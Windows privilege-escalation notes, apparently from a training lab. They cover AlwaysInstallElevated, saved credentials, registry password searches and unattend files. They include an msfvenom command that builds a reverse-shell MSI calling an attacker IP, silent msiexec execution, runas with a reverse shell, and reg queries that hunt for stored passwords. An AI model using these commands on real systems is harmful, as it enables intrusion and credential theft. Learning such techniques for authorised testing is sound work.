# Quick Wins

## Scheduled Tasks

Scheduled tasks can be listed from the command line using the `schtasks` command, using the task scheduler, or, if possible, uploading a tool such as Autoruns64.exe to the target system.

## AlwaysInstallElevated



Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges if the installation requires administrator privileges.\
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

\
This method requires two registry values to be set. You can query these from the command line using the commands below.\
\
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`\
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`\
\
Remember, to be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.\
If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below.\
\
`msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_10.10.200.175 LPORT=LOCAL_PORT -f msi -o malicious.msi`\
\
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly.\
\
Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell.

Command Run on the Target System

```shell-session
C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Passwords

### Saved credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials.\
`cmdkey /list`\


If you see any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.\
`runas /savecred /user:admin reverse_shell.exe`\


### **Registry keys**

Registry keys potentially containing passwords can be queried using the commands below.\
`reg query HKLM /f password /t REG_SZ /s`\
`reg query HKCU /f password /t REG_SZ /s`\


### **Unattend files**

Unattend.xml files helps system administrators setting up Windows systems. They need to be deleted once the setup is complete but can sometimes be forgotten on the system. What you will find in the unattend.xml file can be different according to the setup that was done. If you can find them on a system, they are worth reading.
